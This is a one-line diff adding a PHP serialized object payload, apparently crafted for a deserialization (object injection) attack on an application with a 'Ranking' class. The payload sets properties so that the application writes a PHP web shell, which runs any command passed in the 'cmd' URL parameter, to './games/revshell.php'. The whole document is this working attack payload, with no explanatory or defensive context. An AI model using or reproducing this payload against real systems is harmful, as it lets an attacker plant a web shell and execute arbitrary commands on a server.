@@ -1,0 +1,1 @@
+O:7:"Ranking":3:{s:7:"ranking";s:34:"<?php echo system($_GET['cmd']);?>";s:7:"changed";b:1;s:4:"path";s:20:"./games/revshell.php";}
